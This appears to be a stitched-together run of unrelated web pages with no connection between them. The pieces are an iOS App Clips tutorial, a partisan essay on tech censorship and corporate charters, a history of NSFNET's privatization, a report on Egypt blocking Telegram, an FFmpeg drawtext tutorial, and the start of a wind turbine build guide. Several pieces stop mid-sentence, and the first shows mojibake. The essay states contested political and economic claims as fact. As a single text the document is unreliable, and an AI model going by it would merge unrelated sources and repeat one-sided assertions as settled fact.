<p><img src="https://exyte.com/upload/Introducing-App-Clips-1.jpg" alt=""></p><p>Since the app clipâ€™s code is located in an additional target of your Xcode project, your full app can share existing UI components, code parts, and frameworks with app clips. However, app clips have some limitations due to preserving user privacy: according to documentation, CallKit, CloudKit, HealthKit, Speech, etc. are not available for an app clip use. You canâ€˜t access data from popular system apps such as Apple Music, Files, Reminders and Contacts. You can find full description of app clip limitations and available technologies on the <a rel="nofollow" href="https://developer.apple.com/documentation/app_clips/developing_a_great_app_clip">Apple Developer</a> portal.</p>
<h2>App Clip Discovery</h2>
<p>Users can discover an app clip in multiple ways. Each invocation type could be useful in different scenarios.</p>
<p><img src="https://exyte.com/upload/Introducing-App-Clips-2.jpg" alt=""></p><h3>App Clip Code</h3>
<p>This method might be the most interesting of all. As Apple states on their website, this code can contain an encoded URL and a NFC tag. At the time of writing (October 2020) we donâ€™t know how to create these codes - Apple will provide more information later this year.</p>
<h3>QR Code</h3>
<p>Using the Camera app or a barcode reader, users can scan codes to open an app clip card.</p>
<h3>NFC Tags</h3>
<p>By placing your phone near an NFC tag, you can invoke an app clip card even with a locked screen.</p>
<h3>Messages</h3>
<p>You can open a shared app clip from the Messages app.</p>
<h3>Place Cards</h3>
<p>An app clip can be associated with a place in Maps and invoked from its description.</p>
<h3>Smart App Banner</h3>
<p>You may have seen this banner in Safari, but additionally, it can suggest an app clip after updating configuration parameters.</p>
<h2>Creating an App Clip</h2>
<p>We will demonstrate adding app clips to an existing app because it might be the most popular use case. Here is an example scooter rental app written with SwiftUI that lets you select a scooter on the map and access a support chat.</p>
<p><img src="https://exyte.com/upload/1603369535663-rental-app-ui.png" alt=""></p><p>We created a simple model based on <strong>ObservableObject</strong> to store and update application data in runtime. Since we only wanted to demonstrate app clips features, there is no reason to setup a database and create a more traditional data layer. Instances of this model will be passed as an environment object to corresponding views.</p>

<p>The main screen is represented by a  <strong>MapView</strong> based on <strong>MKMapView</strong> from MapKit framework. Weâ€™ve implemented the <strong>UIViewRepresentable</strong> protocol and a <strong>Coordinator</strong> class to make <strong>MKMapView</strong> work as a SwiftUI view.</p>

<p>When the user selects a scooter on the map the app shows a popup view with rental details.</p>

<p>For the chat screen, we added a SwiftUI view with dummy content.</p>

<p>All these models and views are located in the project's shared folder, which means we can add them to both app and app clip targets.</p>
<p>The full Xcode project is available on <a rel="nofollow" href="https://github.com/exyte/app-clips-example">GitHub</a>. You can see the whole implementation and, of course, test it on your device. </p>
<h3>Add an App Clip Target</h3>
<p>First of all, you need to create a new target from the App Clip template. The overall process is quite simple.</p>
<p><img src="https://exyte.com/upload/app-clip-target-wizard-1.png" alt="">
<img src="https://exyte.com/upload/app-clip-target-wizard-2.png" alt=""></p><p>In order to handle the invocation URL parameters in your app clip, you need to add the Associated Domains Entitlement both to the app and app clip targets. If you are familiar with Universal Links, this process should be pretty easy. Donâ€™t forget to add <strong>applinks</strong> prefix to your associated domain name.</p>
<p><img src="https://exyte.com/upload/1603364905496-app-clip-target-app-links.png" alt=""></p><p>You need to apply configuration changes to the webserver too. Add an <code>appclips</code> dictionary with the app clip bundle identifier to your existing Apple App Site Association file.</p>

<p>Since we are going to reuse existing UI components, we need to add an active compilation condition to the app clip target. This value will allow us to separate parts of code not required for or not compatible with our app clips.</p>
<p><img src="https://exyte.com/upload/app-clips-target-conditions.png" alt=""></p><h3>Responding to Invocations</h3>
<p>As we mentioned earlier, to respond to user actions and show them the app clip state with correct invocation data, we need to handle the invocation URL in our SwiftUI App file. You can read more about <a href="https://developer.apple.com/documentation/app_clips/configuring_your_app_clip_s_launch_experience#3604126">the invocation URL structure</a> and its association with App Clip launch experience on the Apple Developer Portal. Apple did a great job of explaining this topic.
Because this code is only required for an app clip target, letâ€™s add an <strong>if</strong> condition with our <strong>APPCLIP</strong> value check.
In this code listing, we will implement a handler function for the <strong>webpageURL</strong> property of the <strong>NSUserActivity</strong> object. We will update our application data model after parsing the URL components path and query items.</p>

<p>In our case user can invoke the app clip with two possible URL paths:</p>
<ul>
<li><strong>/scooters?id={id}</strong> to select and show a scooter card by finding it using its identifier</li>
<li><strong>/help</strong> to access support chat</li>
</ul>
<p>Since our SwiftUI based components depend on the <strong>AppModel</strong> object data, the app will correctly handle updated properties and update its visual state.</p>
<h2>Testing App Clips</h2>
<p>Testing is an essential part of app clips development, and Apple provides various methods to do it.</p>
<h3>Environment Variable</h3>
<ul>
<li>Click on the active scheme selector in Xcode and select <strong>Edit Scheme</strong>.</li>
<li>Select and set <strong>_XCAppClipURL</strong> environment variable value with the required URL.
<img src="https://exyte.com/upload/app-clip-testing-environment-variable.png" alt=""></li>
<li>Run the app on the device or simulator to test app clip invocation.</li>
</ul>
<h3>Testflight</h3>

<h3>Local Experiences</h3>
<p>This method is only available on iOS 14.2 (or above) and Xcode 12.2. Local Experiences behave the same way as Advanced Experiences in App Store Connect.</p>
<ul>
<li>Make sure that your device is in developer mode.</li>
<li>On you device open <strong>Settings</strong> and select <strong>Developer</strong>.</li>
<li>Go to <em>Local Experiences</em> and select <strong>Register Local Experience</strong>.</li>
</ul>
<p>Here you can setup your app clip invocation properties the same way as in App Store Connect.</p>
<p><img src="https://exyte.com/upload/app-clip-local-experiences.png" alt=""></p><p>After local experiences setup, open the Barcode scanner and scan the QR code with encoded invocation URL to present associated App Clip Card.</p>
<p><img src="https://exyte.com/upload/app-clip-invocation.png" alt=""></p><p>We hope this tutorial will help you discover the potential of app clips experience for your current or future apps. We recommend you take a look at <a rel="nofollow" href="https://developer.apple.com/app-clips/">App Clips documentation</a> on the Apple Developer portal to find out more information about various aspects of setting up app clips.</p>
<p>To sum it up, here is a small video where you can see how app clips can be useful in a real-world scenario.</p>

					<div>
<p><em>This article was written by Brandon Smith</em></p>


<p>The issue of censorship by major tech companies is a precarious one, and I’m becoming increasingly suspicious of the nature of the debate. There are some complexities, but it can all be boiled down to this:</p>


<p>Big tech social media conglomerates argue that their websites are like any other private business and that they are protected from overt government interference by the US constitution. In other words, they have a right to platform or deplatform anyone they choose. Of course, this is the exact OPPOSITE of what most leftist groups have argued in the past when it comes to private businesses refusing to cooperate with people they disagree with on basic principle, such as LGBT activists, but let’s set that hypocrisy aside for now.</p>


<p>Social media companies have decided that the people they want to deplatform most are conservatives, along anyone else who disagrees with hard left ideologies such as social justice or the handling of the pandemic situation. Statements or content that run contrary to leftist philosophies are simply labeled “hate speech” or “conspiracy theory” and are erased.</p>


<p>Conservatives argue that big tech is a monopoly with far too much power, that social media should be treated more like a public resource or “town square” and that these companies are violating the free speech rights of conservatives by specifically targeting them for censorship. Many conservatives are also demanding that Donald Trump and the government step in to regulate or punish such companies for these actions.</p>


<p>The truth is that both sides are right, and both sides are wrong. The real solution to the problem requires a radical change in how we view the institution of corporations and how they interact with government, and it’s a solution I doubt ANY political official will consider, and that includes Trump.</p>


<p>Let me explain…</p>


<p>Social media and big tech do in fact represent a monopoly, but not in terms most people are familiar with. Instead of acting only as an economic monopoly controlling market share, big tech is also a political monopoly controlling the majority of communication platforms. If only one political and social ideological group dominates every major social media and digital information outlet, this in my view represents a completely unbalanced power dynamic that does indeed threaten the free speech rights of the populace.</p>


<p>Rabid censorship of the Hunter Biden laptop scandal, a scandal that is supported by facts and evidence that big tech has chosen to bury because it’s inconvenient to them rather than a violation of their community guidelines, is just one more example of the incredible danger that social media monopolies present.</p>


<p>Obviously, there is the issue of private property rights to consider. I fully support and defend private property rights and I do believe that a business has the freedom to refuse service to anyone for any reason. Just because you open your doors to the public does not mean the public now owns your labor. You should have the right to refuse labor whenever you wish.</p>


<p>If a business refuses a customer based merely on personal bias, then word is going to get around quickly and that business may lose a large number of potential buyers in the future (this is happening right now with multiple alternative social media companies on the rise). The free market should determine the fate of that business, not state or federal governments.</p>


<p>Government itself is an untrustworthy entity that craves a monopoly of power, and by handing government the authority to micromanage the policies and internal practices of web companies we might be trading the big tech monster for an even more dangerous governmental monster.</p>


<p>Who is to say that the government will stop with sites like Facebook or Twitter or Google? Maybe they will exploit their newfound powers to go after smaller websites as well. Maybe they will attempt to micromanage the entire internet. Maybe they will start dominating and restricting conservative websites instead of the leftist conglomerates we intended, and then we will be doubly screwed.</p>


<p>If you value freedom and the Bill of Rights, then this debate leaves us at an impasse. Both sides (perhaps conveniently) lead to a totalitarian outcome. The thing is, the publicly presented argument is a contrived one, a manipulated discussion that only presents two sides when there are more options to consider. The narrative is fixed, it is a farce.</p>


<p>The public has been led to believe that government and corporations are separate tools that can be used to keep each side in check. This is a lie. Big government and big corporations have always worked together while pretending to be disconnected, and this needs to stop if we are to ever defuse the political time bomb we now face.</p>


<p>To solve the social media censorship debacle we need to examine the very roots of corporations as entities. First, corporations as we know them today are a relatively new phenomenon. Adam Smith described the concept of a corporation as a “joint stock company” in his treatise ‘The Wealth Of Nations’, and stood against them as a threat to free market economics. He specifically outlined their history of monopoly and failure, and criticized their habit of avoiding responsibility for mistakes and crimes.</p>


<p>Joint stock companies were chartered by governments and given special protections from risk, as well as protection from civil litigation (lawsuits). But, they were supposed to be temporary business entities, not perpetual business entities. The point was to allow for the creation of a joint stock company to finish a particular job, such as building a railroad, and once the job was finished the company was dissolved and the government protections were no longer needed. Smith knew that if corporations were ever allowed to become permanent fixtures in an economy, they would result in disaster.</p>


<p>This is exactly what happened in 1886 when the Supreme Court allowed companies like Southern Pacific Railroad to use the 14<sup>th</sup> Amendment, which was supposed to protect the constitutional rights of newly freed slaves, as a loophole to declare corporations as “legal persons” with all the protections of an individual citizen. Not only that, but with limited liability, corporations actually became super-citizens with protections far beyond normal individuals. Corporations became the preeminent force in the world and it was their relationship with governments that made this possible.</p>


<p>This fact completely debunks today’s notion of what constitutes free markets. Corporations ARE NOT free market structures. They are, in fact, government chartered and government protected monopolies. They are SOCIALIST creations, not free market creations, and therefore they should not exist in a free market society at all.</p>


<p>The alternative option to corporations was for businesses to form “partnerships”, which did not enjoy protection from government, limited liability or the ability to form monopolies. When the owners of a partnership committed a crime, they could be personally held liable for that crime. When a corporation commits a crime, only the company as a vaporous faceless entity can be punished. This is why it is very rare to see company CEOs face prosecution no matter how egregious and catastrophic their actions.</p>


<p>Today, certain corporations continue to enjoy government protections while also enjoying government welfare. Meaning, these companies get a legal shield while also basking in the advantage of tax incentives and taxpayer dollars.</p>


<p>For example, Google (Alphabet and YouTube) has long <a href="https://www.wired.com/2009/10/youtube-bandwidth/">received huge tax breaks</a> and is rarely if ever forced to pay in full for the massive bandwidth the company uses. In fact, YouTube was facing bandwidth affordability issues until it was purchased by Alphabet and Google, then it no longer had to worry about it – Google gets over 21 times more bandwidth than it actually pays for because of government intervention.</p>


<p>The same rules <a href="https://www.sfchronicle.com/politics/article/SF-supervisors-slam-the-Twitter-tax-break-13953248.php">apply to companies like Twitter</a>, Facebook, Netflix, Apple, etc. All of them <a href="https://www.theguardian.com/media/2019/feb/10/netflix-income-tax-2018-didnt-pay">enjoy extensive tax breaks</a> as well as cheap bandwidth that makes it impossible for small and medium sized businesses to compete, even if they operate on a superior model or have superior ideas. Many times the corporations pay no taxes whatsoever while smaller businesses are crippled by overt payments.</p>


<p>A true free market requires competition as a rule, but the current system deliberately crushes competition. Again, we live in a socialist framework, not a free market framework.</p>


<p>Now that we understand the nature of big tech and what these companies actually are (creations of government), the debate on social media censorship changes.</p>


<p>How? Take for example the fact that public universities in the US are not legally allowed to interfere with free speech rights because many of them survive by consuming taxpayer dollars. They are PUBLIC institutions, not private. Why then are we treating major corporations that survive on endless taxpayer infusions and incentives as if they are private businesses? They are not – They are publicly funded structures chartered by the government and therefore they should be subject to the same rules on free speech that universities are required to follow.</p>


<p>Said corporations will surely argue against this and will attempt to use legal chicanery to maintain their monopolies. Trying to dismantle them could take decades, and there are no guarantees that government officials will even make the attempt? Why would they? The relationship between government and corporations has been an advantageous one for establishment elites for decades.</p>


<p>Instead of challenging the corporate model in the Supreme Court, an easier option would be to simply take away all welfare and tax incentives for any big tech companies that refuse to allow free speech on their platforms. If Google had to pay normal price for the bandwidth it uses, the …</p></div></div></div></div>

<p>In the summer of 1986, Senator Al Gore, Jr., of Tennessee introduced an amendment to the Congressional Act that authorized the&nbsp; budget of the National Science Foundation (NSF). He called for the federal government to study the possibilities for “communications networks for supercomputers at universities and Federal research facilities.” To explain the purpose of this legislation, Gore called on a striking analogy:&nbsp;</p>



<blockquote><p>One promising technology is the development of fiber optic systems for voice and data transmission. Eventually we will see a system of fiber optic systems being installed nationwide. America’s highways transport people and materials across the country. Federal freeways connect with state highways which connect in turn with county roads and city streets. T<em>o transport data and ideas,</em> <em>we will need a telecommunications highway connecting users coast to coast, state to state, city to city</em>. The study required in this amendment will identify the problems and opportunities the nation will face in establishing that highway.<sup>1</sup></p></blockquote>



<p>In the following years, Gore and his allies would call for the creation of an “information superhighway”, or, more formally, a national information infrastructure (NII). As he intended, Gore’s analogy to the federal highway system summons to mind a central exchange that would bind together various local and regional networks, letting all American citizens communicate with one another. However, the analogy also misleads – Gore did not propose the creation of a federally-funded and maintained data network. He envisioned that the information superhighway, unlike its concrete and asphalt namesake, would come into being through the action of market forces, within a regulatory framework that would ensure competition, guarantee open, equal access to any service provider (what would later be known as “net neutrality”), and provide subsidies or other mechanisms to ensure universal service to the least fortunate members of society, preventing the emergence of a gap between the information rich and information poor.<sup>2</sup></p>



<p>Over the following decade, Congress slowly developed a policy response to the growing importance of computer networks to the American research community, to education, and eventually to society as a whole. Congress’ slow march towards an NII policy, however, could not keep up with the rapidly growing NSFNET, overseen by the neighboring bureaucracy of the executive branch. Despite its reputation for sclerosis, bureaucracy was created exactly because of its capacity, unlike a legislature, to respond to events immediately, without deliberation. And so it happened that, between 1988 and 1993, the NSF crafted the policies that would determine how the Internet became private, and thus went public. It had to deal every year with novel demands and expectations from NSFNET’s users and peer networks. In response, it made decisions on the fly, decisions which rapidly outpaced Congressional plans for guiding the development of an information superhighway. These decisions rested largely in the hands of a single man – Stephen Wolff.</p>



<h2>Acceptable Use</h2>



<p>Wolff earned a Ph.D. in electrical engineering at Princeton in 1961 (where he would have been a rough contemporary of Bob Kahn), and began what might have been a comfortable academic career, with a post-doctoral stint at Imperial College, followed by several years teaching at Johns Hopkins. But then he shifted gears, and took a position&nbsp; at the Ballistics Research lab in Aberdeen, Maryland. He stayed there for most of the 1970s and early 1980s, researching communications and computing systems for the U.S. Army. He introduced Unix into the lab’s offices, and managed Aberdeen’s connection to the ARPANET.<sup>3</sup></p>



<p>In 1986, the NSF recruited him to manage the NSF’s supercomputing backbone – he was a natural fit, given his experience connecting Army supercomputers to ARPANET. He became the principal architect of NSFNET’s evolution from that point until his departure in 1994, when he entered the private sector as a manager for Cisco Systems. The original intended function of the net that Wolff was hired to manage had been to connect researchers across the U.S. to NSF-funded supercomputing centers. As we saw last time, however, once Wolff and the other network managers saw how much demand the initial backbone had engendered, they quickly developed a new vision of NSFNET, as a communications grid for the entire American research and post-secondary education community.</p>



<p>However, Wolff did not want the government to be in the business of supplying network services on a permanent basis. In his view, the NSF’s role was to prime the pump, creating the initial demand needed to get a commercial networking services sector off the ground. Once that happened, Wolff felt it would be improper for a government entity to be in competition with viable for-profit businesses. So he intended to get NSF out of the way by privatizing the network, handing over control of the backbone to unsubsidized private entities and letting the market take over.</p>



<p>This was very much in the spirit of the times. Across the Western world, and across most of the political spectrum, government leaders of the 1980s touted privatization and deregulation as the best means to unleash economic growth and innovation after the relative stagnation of the 1970s. As one example among many, around the same time that NSFNET was getting off the ground, the FCC knocked down several decades-old constraints on corporations involved in broadcasting. In 1985, it removed the restriction on owning print and broadcast media in the same locality, and two year later it nullified the fairness doctrine, which had required broadcasters to present multiple views on public-policy debates.&nbsp;</p>



<p>From his post at NSF, Wolff had several levers at hand for accomplishing his goals. The first lay in the interpretation and enforcement of the network’s acceptable use policy (AUP). In accordance with NSF’s mission, the initial policy for the NSFNET backbone, in effect until June 1990, required all uses of the network to be in support of “scientific research and other scholarly activities.” This is quite restrictive indeed, and would seem to eliminate any possibility of commercial use of the network. But Wolff chose to interpret the policy liberally. Regularly mailing list postings about new product releases from a corporation that sold data processing software – was that not in support of scientific research? What about the decision to allow MCI’s email system to connect to the backbone, at the urging of Vint Cerf, who had left government employ to oversee the development of MCI Mail. Wolff rationalized this – and other later interconnections to commercial email systems such as CompuServe’s – as in support of research by making it possible for researchers to communicate digitally with a wider range of people that they might need to contact in the pursuit of their work. A stretch, perhaps. But Wolff saw that allowing some commercial traffic on the same infrastructure that was used for public NSF traffic would encourage the private investment needed to support academic and educational use on a permanent basis.&nbsp;</p>



<p>Wolff’s strategy of opening the door of NSFNET as far as possible to commercial entities got an assist from Congress in 1992, when Congressman Rick Boucher, who helped oversee NSF as chair of the Science Subcommittee, sponsored an amendment to the NSF charter which authorized any additional uses of NSFNET that would “tend to increase the overall capabilities of the networks to support such research and education activities.” This was an<em> ex post facto </em>validation of Wolff’s approach to commercial traffic, allowing virtually any activity as long as it produced profits that encouraged more private investment into NSFNET and its peer networks.&nbsp;&nbsp;</p>



<h2>Dual-Use Networks</h2>



<p>Wolff also fostered the commercial development of networking by supporting the regional networks’ reuse of their networking hardware for commercial traffic. As you may recall, the NSF backbone linked together a variety of not-for-profit regional nets, from NYSERNet in New York to Sesquinet in Texas to BARRNet in northern California. NSF did not directly fund the regional networks, but it did subsidize them indirectly, via the money it provided to labs and universities to offset the costs of their connection to their neighborhood regional net. Several of the regional nets then used this same subsidized infrastructure to spin off a for-profit commercial enterprise, selling network access to the public over the very same wires used for the research and education purposes sponsored by NSF. Wolff encouraged them to do so, seeing this as yet another way to accelerate the transition of the nation’s research and education infrastructure to private control.&nbsp;</p>



<p>This, too, accorded neatly with the political spirit of the 1980s, which encouraged private enterprise to profit from public largesse, in the expectation that the public would benefit indirectly through economic growth. One can see parallels with the dual-use regional networks in the 1980 Bayh-Dole Act, which defaulted ownership of patents derived from government-funded research to the organization performing the work, not to the government that paid for it.&nbsp;</p>



<p>The most prominent example of dual-use in action was PSINet, a for-profit company initially founded as Performance Systems International in 1988. William Schrader and Martin Schoffstall, the co-founder of NYSERNet and one of vice presidents’, respectively, created the company. Schofstall, a former BBN engineer and co-author of the Simple Network Management Protocol (SNMP) for managing the devices on an IP network, was the key technical leader. Schrader, an ambitious Cornell biology major and MBA who had helped his <em>alma mater </em>set up its supercomputing center and get it connected to NSFNET, provided the business drive. He firmly believed that …</p></div></div>

<p>Technology and Law Community “Masaar” documented the blocking of the Telegram website and application by the Egyptian authorities on 22 October 2020. The authorities blocked Telegram on three of the Internet service networks operating in Egypt. These networks included “We”, “Vodafone” and “Orange”. Masaar learned about the blocking action after complaints from several users of the Internet services on the three networks, stating that they cannot access the application or the website. It should be noted that Telegram is one of the most popular and widespread encrypted chat applications in the world.</p>
<p>Masaar confirms that users of the three networks: We (AS8452), Orange (AS24863) and Vodafone (AS36935) cannot use Telegram application on smartphones, as the Egyptian authorities have blocked access to IP addresses of the application.</p>
<p>The authorities also have blocked the Telegram website itself (telegram.org) and the version of Telegram used for desktop computers (web.telegram.org). Further, the blocking involved ADSL and mobile internet (4G / 3G).</p>
<p>It is noteworthy that last September “Masaar” had <a href="https://masaar.net/en/blocked-websites-in-egypt/">published a web page declaring that the authorities have blocked 596 websites and 32 alternative links</a> since May 2017.</p>

<p><strong>Learn FFmpeg’s drawtext filter to dynamically overlay text on video and display information such as timecode, frame resolution, watermarks, etc. Also, let’s learn how to configure the font, font-size, position, background-color, alignment, multiple lines, etc. using FFmpeg’s drawtext filter.</strong></p>

<p>In order to use&nbsp;<code>drawtext</code>, you needed to have configured FFmpeg with&nbsp;<code>--enable-libfreetype</code>. As per the documentation, you need the following options as well if you want to,</p>



<ul><li>enable default font fallback and the font option you need to configure FFmpeg with&nbsp;<code>--enable-libfontconfig</code>.</li><li>enable the text_shaping option, you need to configure FFmpeg with&nbsp;<code>--enable-libfribidi</code>.</li></ul>



<h2 id="complete-list-of-options-for-drawtext"><span id="Complete_List_of_Options_for_drawtext"></span>Complete List of Options for drawtext<span></span></h2>



<p>The complete list of options for&nbsp;<code>drawtext</code>&nbsp;filter can be accessed&nbsp;<a href="https://ffmpeg.org/ffmpeg-filters.html#Syntax" target="_blank" rel="noopener">here</a>. It is far too much for me to explain here, but, if you have any questions, that is the first place you should refer.</p>



<p>In this article, I’ll walk through several common use-cases that should make the concepts easy to understand.</p>



<h2 id="display-text-on-the-video-using-drawtext-filter"><span id="Display_Text_on_the_Video_using_drawtext_filter"></span>Display Text on the Video using drawtext filter<span></span></h2>



<p>Here is the commandline and an explanation of the options</p>



<pre><code>ffmpeg -i inputClip.mp4 -vf "drawtext=text='My text starting at 640x360':x=640:y=360:fontsize=24:fontcolor=white" -c:a copy output.mp4</code></pre>



<p>Here,</p>



<ul><li><code>inputClip.mp4</code>&nbsp;is the input video on which you want to display the text; and the output (containing the text) is to be stored in&nbsp;<code>output.mp4</code></li><li>no audio re-encoding as indicated by&nbsp;<code>-c:a copy</code></li><li>we use the drawtext filter as indicated by the commands&nbsp;<code>-vf "drawtext=........"</code></li><li><code>text='My text starting at 640x360'</code>&nbsp;is the text that will be shown on the video (you could make it your name for watermarking the video, right?)</li><li>position of the text<ul><li><code>x=640:y=360</code>&nbsp;indicates that the x and y coordinates as&nbsp;<code>640px</code>&nbsp;and&nbsp;<code>360px</code>. Also, as a side note, the video’s resolution is&nbsp;<code>1280x720</code>.</li><li>font size is&nbsp;<code>24</code></li><li>font color is&nbsp;<code>white</code></li></ul></li></ul>



<p>Let’s see how the output looks, shall we?</p>

<p>A better way to this is to offset the text by the length of the text that you are printing on the screen.</p>



<p>Confused?</p>



<p>If you look at the image above, you’ll see that it starts at the center of the video and extends towards the right.</p>



<p><strong>If you want to center the text itself, then you can subtract the height and width of the rendered text when telling&nbsp;<code>drawtext</code>&nbsp;where to render the text.</strong></p>



<p>Here’s how. You use the command&nbsp;<code>x=(w-text_w)/2:y=(h-text_h)/2</code>&nbsp;and it will center the text. Here is our new commandline –</p>



<pre><code>ffmpeg -i inputClip.mp4 -vf "drawtext=text='Centered Text':x=(w-text_w)/2:y=(h-text_h)/2:fontsize=24:fontcolor=white" -c:a copy output.mp4</code></pre>



<p>Now, the text looks nice and pretty 🙂</p>

<p><strong>Fantastic – you now know how to overlay text onto a video using FFmpeg’s&nbsp;<code>drawtext</code>&nbsp;filter. Do you think you can add your own watermark or copyright? Let’s try 🙂</strong></p>



<h2 id="adding-a-copyright-notice-or-text-watermark-using-ffmpegs-drawtext-filter"><span id="Adding_a_Copyright_notice_or_Text_Watermark_using_FFmpeg%E2%80%99s_drawtext_filter"></span>Adding a Copyright notice or Text Watermark using FFmpeg’s drawtext filter<span></span></h2>



<p>Let’s modify the command as follows to indicate my name and the copyright symbol.</p>



<pre><code>ffmpeg -i inputClip.mp4 -vf "drawtext=text='© Krishna':x=640:y=360:fontsize=24:fontcolor=white" -c:a copy output.mp4</code></pre>



<p>This produces an output like this – looks good right? You can play around with the&nbsp;<code>x</code>&nbsp;and&nbsp;<code>y</code>&nbsp;coordinates to align the text the way you want to.</p>

<h2 id="adding-text-with-background-color-using-ffmpegs-drawtext-filter"><span id="Adding_Text_with_Background_Color_using_FFmpeg%E2%80%99s_drawtext_filter"></span>Adding Text with Background Color using FFmpeg’s drawtext filter<span></span></h2>



<p>To add a background color, we need</p>



<pre><code>ffmpeg -i inputClip.mp4 -vf "drawtext=text='© Krishna':x=(1100-text_w):y=(600-text_h):fontsize=32:fontcolor=black:box=1:boxcolor=white@0.5: boxborderw=5" -c:a copy output.mp4</code></pre>



<p>The new commands here are –</p>



<ul><li><code>box</code>&nbsp;: this is either&nbsp;<code>1</code>&nbsp;(enabled) or&nbsp;<code>0</code>&nbsp;(disabled)</li><li><code>boxcolor:&nbsp;white@0.5</code>&nbsp;implies a white colored box with a 50% opacity.</li><li><code>boxborderw</code>&nbsp;is the width of the box’s border and the border color is taken from&nbsp;<code>boxcolor</code>.</li></ul>



<p>And there you have it, text with a background. In this example, I switched the color of the text to black so that it contrasts well with a light background bounding box (which in-turn contrasts well with a dark background.)</p>

<h2 id="displaying-timecodes--timestamps-using--ffmpegs-drawtext-filter"><span id="Displaying_TimeCodes_/_TimeStamps_using_FFmpeg%E2%80%99s_drawtext_filter"></span>Displaying TimeCodes / TimeStamps using FFmpeg’s drawtext filter<span></span></h2>



<p>This is a very useful application of the&nbsp;<code>drawtext</code>&nbsp;filter and is used in demonstrating low-latency applications or visual quality testing so that one knows precisely what the timestamps/timecodes are at each time.</p>



<pre><code>ffmpeg -i inputClip.mp4 -vf "drawtext=text='timestamp: %{pts \: hms}': x=500: y=500: fontsize=32:fontcolor=yellow@0.9: box=1: boxcolor=black@0.6" -c:a copy output.mp4</code></pre>



<p>This uses the&nbsp;<code>timestamp</code>&nbsp;and&nbsp;<code>pts</code>&nbsp;options to display time in hour:min:sec format using the&nbsp;<code>hms</code>&nbsp;format specifier. The notations and formatting are complex in my opion! So, a lot of trial and error might be needed before you format your display correctly.</p>



<p>Here is how the video looks. Hope Vimeo shows you the video without a lot of delay 🙂</p>

</div></figure>



<p>And here is the same command, but using the&nbsp;<code>flt</code>&nbsp;option to provide microsecond time accuracy! Fancy 🙂</p>



<pre><code>ffmpeg -i inputClip.mp4 -vf "drawtext=text='timestamp: %{pts \: flt}': x=500: y=500: fontsize=32:fontcolor=yellow@0.9: box=1: boxcolor=black@0.6" -c:a copy output.mp4

<h2 id="display-movie-credits-using-ffmpegs-drawtext-filter"><span id="Display_Movie_Credits_using_FFmpeg%E2%80%99s_drawtext_filter"></span>Display Movie Credits using FFmpeg’s drawtext filter<span></span></h2>



<p>Finally, let’s learn how to show a movie’s credits using the draw text filter. Here are two main concepts that you need to understand.</p>



<ul><li>providing a lot of text: you can’t do this via the commandline, so, you need to read a text file that contains the text. And you can read that using the&nbsp;<code>textfile</code>&nbsp;option.</li><li>and, specify the speed of scrolling using the&nbsp;<code>y</code>&nbsp;text position. Here, you can provide an equation instead of a constant number. You start off by telling by FFmpeg that the y-position is&nbsp;<code>h - 80*t</code>&nbsp;so that everytime the value of time increases, the value of&nbsp;<code>h - 80*t*</code>&nbsp;decreases, and the text is displayed higher. Makes sense?</li></ul>



<p><strong>Tip: change&nbsp;<code>80</code>&nbsp;to&nbsp;<code>100</code>&nbsp;or&nbsp;<code>120</code>&nbsp;and see the effect on the scrolling speed.</strong></p>



<pre><code>ffmpeg -i inputClip.mp4 -vf "drawtext=textfile=credits.txt: x=200: y=h-80*t: fontsize=36:fontcolor=yellow@0.9: box=1: boxcolor=black@0.6" -c:a copy outputCredits.mp4
</code></pre>



<p>Here is the output:</p>

<p>That’s it for this tutorial on using FFmpeg’s&nbsp;<code>drawtext</code>&nbsp;filter to produce dynamic overlays on your videos. It is a very versatile and handy tool that you can use to overlay text, timecodes, credits, copyrights notices on your videos.</p>

<p><strong><a name="desc" id="desc"></a>Description:</strong></p><p>

  This is a Vertical Axis Wind Turbine which uses wind energy to  drive things like an alternator/generator for producing electricity,  or air and water pumps for cooling, irrigation and similar.<br>
  The  turbine uses the 35-40% mechanically efficient Lenz2 lift+drag  design. It is made almost entirely from scrap materials, and should  cost about $15-$30 for the six vane version, which can be made by two  people in four hours without much effort. <br>
The three vane  version has been successfully survival tested to 80 km/h sustained  winds and the six vane version to 105 km. Both will do more, but  exactly how much has not yet been ascertained. The current longest  running version has been up since early 2014, through reasonable  storms, with no noticeable wear and tear as of yet.</p>
<iframe width="320" height="180" src="https://www.youtube.com/embed/8oe6egO0YOc" frameborder="0" allowfullscreen=""></iframe>

<p>Full power curves have yet to be calculated for this  particular build, but according to Mr Ed Lenz's calculations a six  vane at 0.91 meters diameter and 1.1 meters high with a 90% efficient  alternator should produce at least 130 watts of electricity in a 30  km/h wind, and 1 kilowatt at 60 km/h. </p><p>
The materials  listed in this tutorial are to make the three vane version. Double  everything except the bike wheel for six vanes.

<h3><a name="resources" id="steps2"></a>Resources:</h3>

<p><a name="steps" id="steps"></a>
<strong>Step by step build instructions:</strong></p>
<p>These relate to the animation to the left. </p>
<p><strong>Step 1:</strong><br>
  Download and print the two template  files from the links above. Make sure they're printed at 100% (200  dpi). When printed measure the distance between the dimension arrows,  it should be 10cm on both pages. If it's a couple mm off that's  probably ok.</p>
<p>Tape the pages together so that the 10cm dimension marks overlap  as closely as possible. Best way to do this is on a window pane  during the day, so you can see both pages showing through.<br>
  With  a craft knife and the angle aluminium as a straight edge, cut out the  outer border of the template.<br>
  Any time you're cutting, always  make sure your other hand is never in front of the knife, so if you  slip you're not going to slice yourself. The angle aluminium is good  for this, as the vertical bit effectively shields the hand holding  it.</p>
<p><strong>2</strong><strong>:</strong><br>
  Take an aluminium sheet  and measure a box 42cm x 48cm. Draw a line half way up the 48cm  length so you have two boxes measuring 42cm x 24cm. Score the outer  lines with the Stanley knife and straight edge. You're not trying to  cut through the metal, just create a line that can then be popped out  later. A good method is to score once lightly, then a second time a  bit deeper.<br>
  Do not score the 24cm halfway line.</p>
<p>Flex the metal so that it bends at a score line, then flex back  the other way. Do this a couple times and it should split. Do the  same for the other score and remove the outer metal. Keep it for  later. </p>
<p><strong>3</strong><strong>:</strong><br>
  Tape the template to the  metal rectangle (from now on to be referred to as a 'former') so that  the long edge of the paper sits on the middle line and the right hand  edges of both line up. Don't worry if the other edges don't align  perfectly.</p>
<p>With blade and straight edge, score out the template curve,  including the triangles at each end. It's not essential that this be  100% perfect, but try to get the first one reasonably nice as you can  then use it as a template for the rest.</p>
<p>Score, flex, and remove the two triangles of metal outside the  template.</p>
<p><strong>4</strong><strong>:</strong><br>
  Mark the centers of the  little circles on the paper template with a marker pen so that  they're visible from the other side and flip the paper over so that  the printed side is down on the other half of the former, keeping the  long edge on the middle line. Retape so it doesn't shift.<br>
